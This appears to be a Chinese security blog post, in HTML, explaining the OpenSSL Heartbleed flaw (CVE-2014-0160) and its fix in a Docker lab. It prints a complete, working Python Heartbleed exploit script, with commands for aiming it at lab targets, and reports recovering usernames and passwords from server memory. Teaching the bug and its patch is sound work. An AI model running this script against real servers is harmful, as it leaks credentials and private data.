@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8" />
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"><title>Openssl Heartbleed漏洞利用与修复 - Vampire blog</title><meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta itemprop="name" content="Openssl Heartbleed漏洞利用与修复">
+<meta itemprop="description" content="Heartbleed漏洞简介 Heartbleed漏洞是openssl的漏洞，这个漏洞（CVE-2014-0160）的产生是由于没有在memcpy()调用受害用户输入内容作为长度参数之前正确进行边界检查。攻击者可以追踪OpenSSL所分配的64KB缓存、将超出必要范围的字节信息复制到缓存当中再返回缓存中，这样一来受害者的内存内容就会以每次64K的速度进行泄露。
+心跳功能介绍 正常情况下要使SSL发挥作用，需要与服务器进行通信，所以它会发送一个“heartbeat”（心跳）包，通过包内的特定信号，进行判断服务器是否存活，服务器就会向计算机返回该信号，让服务器确保安全通信。而且计算机和服务器之间会定期发送hearbeat以确定用户和服务器没有脱机。
+漏洞原理 该漏洞主要问题出在heartbeat心跳检测的扩展中，在源码d1_both.c中，找到如下代码
+#ifndef OPENSSL_NO_HEARTBEATS int dtls1_process_heartbeat(SSL *s) { unsigned char *p = &amp;s-&gt;s3-&gt;rrec.data[0], *pl; unsigned short hbtype; unsigned int payload; unsigned int padding = 16; 指针p指向一条SSLv3结构体中的数据，结构体SSL3_RECORD的定义如下： 代码段1
+typedef struct ssl3_record_st { int type; unsigned int length; unsigned int off; unsigned char *data; unsigned char *input; unsigned char *comp; unsigned long epoch; unsigned char seq_num[8]; } SSL3_RECORD; 其中type为心跳包的类型，length为数据长度，data为数据正文
+代码段2
+hbtype = *p&#43;&#43;; n2s(p, payload); pl = p; 首先获取type的心跳包的类型，类型有两种TLS1_HB_REQUEST和TLS1_HB_RESPONSE，然后使用宏n2s从指针p指向的数组中取出前两个字节，并把它们存入变量payload中，最后将变量pl指向由访问者提供的心跳包数据。">
+<meta itemprop="datePublished" content="2019-11-04T18:10:31&#43;08:00" />
+<meta itemprop="dateModified" content="2019-11-04T18:10:31&#43;08:00" />
+<meta itemprop="wordCount" content="895">
+
+
+
+<meta itemprop="keywords" content="漏洞修复," /><meta property="og:title" content="Openssl Heartbleed漏洞利用与修复" />
+<meta property="og:description" content="Heartbleed漏洞简介 Heartbleed漏洞是openssl的漏洞，这个漏洞（CVE-2014-0160）的产生是由于没有在memcpy()调用受害用户输入内容作为长度参数之前正确进行边界检查。攻击者可以追踪OpenSSL所分配的64KB缓存、将超出必要范围的字节信息复制到缓存当中再返回缓存中，这样一来受害者的内存内容就会以每次64K的速度进行泄露。
+心跳功能介绍 正常情况下要使SSL发挥作用，需要与服务器进行通信，所以它会发送一个“heartbeat”（心跳）包，通过包内的特定信号，进行判断服务器是否存活，服务器就会向计算机返回该信号，让服务器确保安全通信。而且计算机和服务器之间会定期发送hearbeat以确定用户和服务器没有脱机。
+漏洞原理 该漏洞主要问题出在heartbeat心跳检测的扩展中，在源码d1_both.c中，找到如下代码
+#ifndef OPENSSL_NO_HEARTBEATS int dtls1_process_heartbeat(SSL *s) { unsigned char *p = &amp;s-&gt;s3-&gt;rrec.data[0], *pl; unsigned short hbtype; unsigned int payload; unsigned int padding = 16; 指针p指向一条SSLv3结构体中的数据，结构体SSL3_RECORD的定义如下： 代码段1
+typedef struct ssl3_record_st { int type; unsigned int length; unsigned int off; unsigned char *data; unsigned char *input; unsigned char *comp; unsigned long epoch; unsigned char seq_num[8]; } SSL3_RECORD; 其中type为心跳包的类型，length为数据长度，data为数据正文
+代码段2
+hbtype = *p&#43;&#43;; n2s(p, payload); pl = p; 首先获取type的心跳包的类型，类型有两种TLS1_HB_REQUEST和TLS1_HB_RESPONSE，然后使用宏n2s从指针p指向的数组中取出前两个字节，并把它们存入变量payload中，最后将变量pl指向由访问者提供的心跳包数据。" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://vampire-lab.github.io/posts/openssl-heartbleed%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8E%E4%BF%AE%E5%A4%8D/" />
+<meta property="article:published_time" content="2019-11-04T18:10:31+08:00" />
+<meta property="article:modified_time" content="2019-11-04T18:10:31+08:00" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Openssl Heartbleed漏洞利用与修复"/>
+<meta name="twitter:description" content="Heartbleed漏洞简介 Heartbleed漏洞是openssl的漏洞，这个漏洞（CVE-2014-0160）的产生是由于没有在memcpy()调用受害用户输入内容作为长度参数之前正确进行边界检查。攻击者可以追踪OpenSSL所分配的64KB缓存、将超出必要范围的字节信息复制到缓存当中再返回缓存中，这样一来受害者的内存内容就会以每次64K的速度进行泄露。
+心跳功能介绍 正常情况下要使SSL发挥作用，需要与服务器进行通信，所以它会发送一个“heartbeat”（心跳）包，通过包内的特定信号，进行判断服务器是否存活，服务器就会向计算机返回该信号，让服务器确保安全通信。而且计算机和服务器之间会定期发送hearbeat以确定用户和服务器没有脱机。
+漏洞原理 该漏洞主要问题出在heartbeat心跳检测的扩展中，在源码d1_both.c中，找到如下代码
+#ifndef OPENSSL_NO_HEARTBEATS int dtls1_process_heartbeat(SSL *s) { unsigned char *p = &amp;s-&gt;s3-&gt;rrec.data[0], *pl; unsigned short hbtype; unsigned int payload; unsigned int padding = 16; 指针p指向一条SSLv3结构体中的数据，结构体SSL3_RECORD的定义如下： 代码段1
+typedef struct ssl3_record_st { int type; unsigned int length; unsigned int off; unsigned char *data; unsigned char *input; unsigned char *comp; unsigned long epoch; unsigned char seq_num[8]; } SSL3_RECORD; 其中type为心跳包的类型，length为数据长度，data为数据正文
+代码段2
+hbtype = *p&#43;&#43;; n2s(p, payload); pl = p; 首先获取type的心跳包的类型，类型有两种TLS1_HB_REQUEST和TLS1_HB_RESPONSE，然后使用宏n2s从指针p指向的数组中取出前两个字节，并把它们存入变量payload中，最后将变量pl指向由访问者提供的心跳包数据。"/>
+<link href='https://fonts.googleapis.com/css?family=Playfair+Display:700' rel='stylesheet' type='text/css'>
+	<link rel="stylesheet" type="text/css" media="screen" href="https://vampire-lab.github.io/css/normalize.css" />
+	<link rel="stylesheet" type="text/css" media="screen" href="https://vampire-lab.github.io/css/main.css" />
+
+        <link id="dark-scheme" rel="stylesheet" type="text/css" href="https://vampire-lab.github.io/css/dark.css" />
+
+	<script src="https://cdn.jsdelivr.net/npm/feather-icons/dist/feather.min.js"></script>
+		<script src="https://vampire-lab.github.io/js/main.js"></script>
+</head>
+
+<body>
+	<div class="container wrapper">
+		<div class="header">
+	
+		<div class="avatar">
+			<a href="https://vampire-lab.github.io/">
+				<img src="/images/im/t.png" alt="Vampire blog" />
+			</a>
+		</div>
+	
+	<h1 class="site-title"><a href="https://vampire-lab.github.io/">Vampire blog</a></h1>
+	<div class="site-description"><p>不去想是否能够成功,既然选择了远方,便只顾风雨兼程。</p><nav class="nav social">
+			<ul class="flat"><li><a href="https://github.com/vampire-lab" title="Github"><i data-feather="github"></i></a></li><li><a href="/index.xml" title="RSS"><i data-feather="rss"></i></a></li></ul>
+		</nav><span class="scheme-toggle"><a href="#" id="scheme-toggle"></a></div>
+
+	<nav class="nav">
+		<ul class="flat">
+			
+			<li>
+				<a href="/">Home</a>
+			</li>
+			
+			<li>
+				<a href="/posts">All posts</a>
+			</li>
+			
+			<li>
+				<a href="/about">About</a>
+			</li>
+			
+			<li>
+				<a href="/tags">Tags</a>
+			</li>
+			
+		</ul>
+	</nav>
+</div>
+
+
+		<div class="post">
+			<div class="post-header">
+				
+					<div class="meta">
+						<div class="date">
+							<span class="day">04</span>
+							<span class="rest">Nov 2019</span>
+						</div>
+					</div>
+				
+				<div class="matter">
+					<h1 class="title">Openssl Heartbleed漏洞利用与修复</h1>
+				</div>
+			</div>
+					
+			<div class="markdown">
+				<h4 id="heartbleed漏洞简介">Heartbleed漏洞简介</h4>
+<p>Heartbleed漏洞是openssl的漏洞，这个漏洞（CVE-2014-0160）的产生是由于没有在memcpy()调用受害用户输入内容作为长度参数之前正确进行边界检查。攻击者可以追踪OpenSSL所分配的64KB缓存、将超出必要范围的字节信息复制到缓存当中再返回缓存中，这样一来受害者的内存内容就会以每次64K的速度进行泄露。</p>
+<h4 id="心跳功能介绍">心跳功能介绍</h4>
+<p>正常情况下要使SSL发挥作用，需要与服务器进行通信，所以它会发送一个“heartbeat”（心跳）包，通过包内的特定信号，进行判断服务器是否存活，服务器就会向计算机返回该信号，让服务器确保安全通信。而且计算机和服务器之间会定期发送hearbeat以确定用户和服务器没有脱机。</p>
+<h4 id="漏洞原理">漏洞原理</h4>
+<p>该漏洞主要问题出在heartbeat心跳检测的扩展中，在源码d1_both.c中，找到如下代码</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">#ifndef OPENSSL_NO_HEARTBEATS
+int dtls1_process_heartbeat(SSL *s)
+{
+unsigned char *p = &amp;s-&gt;s3-&gt;rrec.data[0], *pl;
+unsigned short hbtype;
+unsigned int payload;
+unsigned int padding = 16;
+</code></pre></div><p>指针p指向一条SSLv3结构体中的数据，结构体SSL3_RECORD的定义如下：
+代码段1</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">typedef struct ssl3_record_st
+{
+       int type;
+       unsigned int length;
+       unsigned int off;
+       unsigned char *data;
+       unsigned char *input;
+       unsigned char *comp;
+       unsigned long epoch;
+       unsigned char seq_num[8];
+} SSL3_RECORD;
+</code></pre></div><p>其中type为心跳包的类型，length为数据长度，data为数据正文</p>
+<p>代码段2</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">hbtype = *p++;
+n2s(p, payload);
+pl = p;
+</code></pre></div><p>首先获取type的心跳包的类型，类型有两种TLS1_HB_REQUEST和TLS1_HB_RESPONSE，然后使用宏n2s从指针p指向的数组中取出前两个字节，并把它们存入变量payload中，最后将变量pl指向由访问者提供的心跳包数据。</p>
+<p>代码段3</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">if (hbtype == TLS1_REQUEST)
+{
+    unsigned char *buffer, *bp;
+    int r;
+    
+    buffer = OPENSSL_malloc(1 + 2 + payload + padding);
+    bp = buffer;
+    .....
+    .....
+}
+</code></pre></div><p>该代码可以分配一段由访问者指定大小的内存区域，这段空间最大为（1 + 2 + 65535 + 16）个字节，bp用来访问新分配的内存区域。</p>
+<p>代码段4</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">*bp++ = TLS1_HB_RESPONSE;
+s2n(payload, bp);
+memcpy(bp, pl, payload);
+bp += payload;
+</code></pre></div><p>其中宏s2n与宏n2s干的事情刚好相反：
+s2n读入一个16 bit长的值，然后将它存成双字节值，所以s2n会将与请求的心跳包载荷长度相同的长度值存入变量payload。然后程序将pl以payload为大小的长度，复制到bp中。</p>
+<p>漏洞主要因为用户可控制变量payload和pl。该变量直接影响到了memcpy函数，导致如果用户并没有在心跳包中给足够多的数据，比如pl指向的数据只有一个字节，memcpy会将这条SSLv3后面的数据以payload为长度，复制出来（无论是什么数据）。</p>
+<h4 id="漏洞利用">漏洞利用</h4>
+<h5 id="利用脚本">利用脚本</h5>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">#!/usr/bin/python
+
+# Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)
+# The author disclaims copyright to this source code.
+
+import sys
+import struct
+import socket
+import time
+import select
+import re
+from optparse import OptionParser
+
+options = OptionParser(usage=&#39;%prog server [options]&#39;, description=&#39;Test for SSL heartbeat vulnerability (CVE-2014-0160)&#39;)
+options.add_option(&#39;-p&#39;, &#39;--port&#39;, type=&#39;int&#39;, default=443, help=&#39;TCP port to test (default: 443)&#39;)
+
+def h2bin(x):
+    return x.replace(&#39; &#39;, &#39;&#39;).replace(&#39;\n&#39;, &#39;&#39;).decode(&#39;hex&#39;)
+
+hello = h2bin(&#39;&#39;&#39;
+16 03 02 00  dc 01 00 00 d8 03 02 53
+43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
+bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
+00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
+00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
+c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
+c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
+c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
+c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
+00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
+03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
+00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
+00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
+00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
+00 0f 00 01 01                                  
+&#39;&#39;&#39;)
+
+hb = h2bin(&#39;&#39;&#39; 
+18 03 02 00 03
+01 40 00
+&#39;&#39;&#39;)
+
+def hexdump(s):
+    for b in xrange(0, len(s), 16):
+        lin = [c for c in s[b : b + 16]]
+        hxdat = &#39; &#39;.join(&#39;%02X&#39; % ord(c) for c in lin)
+        pdat = &#39;&#39;.join((c if 32 &lt;= ord(c) &lt;= 126 else &#39;.&#39; )for c in lin)
+        print &#39;  %04x: %-48s %s&#39; % (b, hxdat, pdat)
+    print
+
+def recvall(s, length, timeout=5):
+    endtime = time.time() + timeout
+    rdata = &#39;&#39;
+    remain = length
+    while remain &gt; 0:
+        rtime = endtime - time.time() 
+        if rtime &lt; 0:
+            return None
+        r, w, e = select.select([s], [], [], 5)
+        if s in r:
+            data = s.recv(remain)
+            # EOF?
+            if not data:
+                return None
+            rdata += data
+            remain -= len(data)
+    return rdata
+        
+
+def recvmsg(s):
+    hdr = recvall(s, 5)
+    if hdr is None:
+        print &#39;Unexpected EOF receiving record header - server closed connection&#39;
+        return None, None, None
+    typ, ver, ln = struct.unpack(&#39;&gt;BHH&#39;, hdr)
+    pay = recvall(s, ln, 10)
+    if pay is None:
+        print &#39;Unexpected EOF receiving record payload - server closed connection&#39;
+        return None, None, None
+    print &#39; ... received message: type = %d, ver = %04x, length = %d&#39; % (typ, ver, len(pay))
+    return typ, ver, pay
+
+def hit_hb(s):
+    s.send(hb)
+    while True:
+        typ, ver, pay = recvmsg(s)
+        if typ is None:
+            print &#39;No heartbeat response received, server likely not vulnerable&#39;
+            return False
+
+        if typ == 24:
+            print &#39;Received heartbeat response:&#39;
+            hexdump(pay)
+            if len(pay) &gt; 3:
+                print &#39;WARNING: server returned more data than it should - server is vulnerable!&#39;
+            else:
+                print &#39;Server processed malformed heartbeat, but did not return any extra data.&#39;
+            return True
+
+        if typ == 21:
+            print &#39;Received alert:&#39;
+            hexdump(pay)
+            print &#39;Server returned error, likely not vulnerable&#39;
+            return False
+
+def main():
+    opts, args = options.parse_args()
+    if len(args) &lt; 1:
+        options.print_help()
+        return
+
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    print &#39;Connecting...&#39;
+    sys.stdout.flush()
+    s.connect((args[0], opts.port))
+    print &#39;Sending Client Hello...&#39;
+    sys.stdout.flush()
+    s.send(hello)
+    print &#39;Waiting for Server Hello...&#39;
+    sys.stdout.flush()
+    while True:
+        typ, ver, pay = recvmsg(s)
+        if typ == None:
+            print &#39;Server closed connection without sending Server Hello.&#39;
+            return
+        # Look for server hello done message.
+        if typ == 22 and ord(pay[0]) == 0x0E:
+            break
+
+    print &#39;Sending heartbeat request...&#39;
+    sys.stdout.flush()
+    s.send(hb)
+    hit_hb(s)
+
+if __name__ == &#39;__main__&#39;:
+    main()
+</code></pre></div><h5 id="执行结果">执行结果</h5>
+<p>执行一下利用脚本
+<img src="/images/2019/openssl-heartbleed/c64ce401c3a556f762bac2961fc03ca9.png" alt="c64ce401c3a556f762bac2961fc03ca9.png"></p>
+<p>查看脚本利用方法，看到提示，脚本名称后接靶机地址，然后指定靶机端口即可，由于64Kb内存信息较大，我们使用重定向功能将执行结果保存到txt当中，执行代码如下</p>
+<p><code>python ssltest.py 1.1.1.1 -p 443 &gt; test.txt</code></p>
+<p>访问靶机地址
+https://10.1.1.136 进行登陆，如下图
+<img src="/images/2019/openssl-heartbleed/f46b0d7c631543160b948c7319769220.png" alt="f46b0d7c631543160b948c7319769220.png">
+靶机使用的是合天网安实验室提供的环境</p>
+<p>执行利用脚本
+<img src="/images/2019/openssl-heartbleed/8bb5ac4166b39949a164c266a6c26aad.png" alt="8bb5ac4166b39949a164c266a6c26aad.png"></p>
+<p>获取到内存的结果如下
+<img src="/images/2019/openssl-heartbleed/c81baa32e8176182d7607067155dd08a.png" alt="c81baa32e8176182d7607067155dd08a.png">
+得到用户名密码，真实环境可能会获取到更多的敏感信息。</p>
+<h4 id="漏洞修复">漏洞修复</h4>
+<p>这里使用的是docker搭建的靶机，靶机GitHub地址为
+<code>https://github.com/Medicean/VulApps</code></p>
+<p>使用命令运行靶机</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">拉取镜像
+docker pull medicean/vulapps:o_openssl_heartbleed
+启动环境
+docker run -d -p 443:443 medicean/vulapps:o_openssl_heartbleed
+查看docker运行情况
+docker container ls
+</code></pre></div><p><img src="/images/2019/openssl-heartbleed/20017fc5e9f893683c187e771b6cf793.png" alt="20017fc5e9f893683c187e771b6cf793.png">
+访问靶机地址
+https://10.10.10.128
+<img src="/images/2019/openssl-heartbleed/61eee41a3972e362bd0e9756d8024069.png" alt="61eee41a3972e362bd0e9756d8024069.png"></p>
+<p>运行漏洞利用脚本测试,查看使用方法</p>
+<p><img src="/images/2019/openssl-heartbleed/7082e320f359cd50c37144bda4b7b9d6.png" alt="7082e320f359cd50c37144bda4b7b9d6.png"></p>
+<p>使用命令进行测试</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">python opensslpoc.py -d 10.10.10.128 -p 443 &gt; 1.txt
+指定地址和端口号，将抓取的内存信息重定向到1.txt中
+</code></pre></div><p><img src="/images/2019/openssl-heartbleed/b5bebce51f42b7d6a8b61c95fcaf33ea.png" alt="b5bebce51f42b7d6a8b61c95fcaf33ea.png"></p>
+<p>证明存在漏洞</p>
+<p>我们尝试修复漏洞
+使用命令进入docker靶机命令行</p>
+<p><code>docker container exec -it  agitated_agnesi /bin/bash</code></p>
+<p><img src="/images/2019/openssl-heartbleed/7c0b9b28628e4ad0dc1802796e03a632.png" alt="7c0b9b28628e4ad0dc1802796e03a632.png"></p>
+<p>查看openssl版本
+<img src="/images/2019/openssl-heartbleed/a4957fb2d5d814692c38df8d86d0a152.png" alt="a4957fb2d5d814692c38df8d86d0a152.png"></p>
+<p>下载新版本openssl安装文件</p>
+<p><code>wget https://www.openssl.org/source/openssl-x.x.x.tar.gz</code></p>
+<p><img src="/images/2019/openssl-heartbleed/3f06d7d927bd5e110e953803cb44478d.png" alt="3f06d7d927bd5e110e953803cb44478d.png"></p>
+<p>解压安装包</p>
+<p><code>tar zxvf openssl-x.x.x.tar.gz</code></p>
+<p>执行命令</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">cd openssl-x.x.x
+./config
+make
+make install
+</code></pre></div><p>安装成功之后
+执行以下命令</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">mv /usr/bin/openssl /usr/bin/openssl.bak
+ln -s /usr/local/bin/openssl /usr/bin/openssl
+ln -s /usr/local/include/openssl /usr/include/openssl
+echo &#34;/usr/local/lib&#34; &gt;&gt; /etc/ld.so.conf
+</code></pre></div><p><img src="/images/2019/openssl-heartbleed/4e9ca3a7e6a13b8e258ad405a5f9ee47.png" alt="4e9ca3a7e6a13b8e258ad405a5f9ee47.png"></p>
+<p>测试</p>
+<p><code>openssl version</code></p>
+<p><img src="/images/2019/openssl-heartbleed/17513bc34899a9a8d38e25dcf4db5fdf.png" alt="17513bc34899a9a8d38e25dcf4db5fdf.png">
+出现上图提示，执行如下命令</p>
+<div class="highlight"><pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">cp /usr/local/lib/libssl.so.1.1 /usr/lib/
+cp /usr/local/lib/libcrypto.so.1.1 /usr/lib/
+</code></pre></div><p><img src="/images/2019/openssl-heartbleed/143d40f4b901e684e43d986ee7df4c32.png" alt="143d40f4b901e684e43d986ee7df4c32.png"></p>
+<p>执行命令测试</p>
+<p><code>openssl version</code></p>
+<p><img src="/images/2019/openssl-heartbleed/eebf633565914c4b89a074b1387ccd57.png" alt="eebf633565914c4b89a074b1387ccd57.png"></p>
+<p>更新成功</p>
+<p>如果验证还是存在漏洞，需要更新一下libssl
+这里使用apt进行更新</p>
+<p><code>apt-get install libssl-dev</code></p>
+<p>重启Apache服务</p>
+<p><code>/etc/init.d/apache2 restart</code></p>
+<p><img src="/images/2019/openssl-heartbleed/34165f92804c23f01fc9627ae3d94901.png" alt="34165f92804c23f01fc9627ae3d94901.png"></p>
+<p>验证修复完成</p>
+<p><img src="/images/2019/openssl-heartbleed/9287c5fd2b61afb89d28b44b91bc728a.png" alt="9287c5fd2b61afb89d28b44b91bc728a.png"></p>
+
+			</div>
+
+			<div class="tags">
+				
+					
+						<ul class="flat">
+							
+							<li><a href="/tags/%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D">漏洞修复</a></li>
+							
+						</ul>
+					
+				
+			</div>
+
+
+		</div>
+	</div>
+	<div class="footer wrapper">
+	<nav class="nav">
+		<div>2019  © Copyright notice |  <a href="https://github.com/knadh/hugo-ink">Ink</a> theme on <a href="https://gohugo.io">Hugo</a></div>
+	</nav>
+</div>
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-123-45', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+<script>feather.replace()</script>
+</body>
+</html>
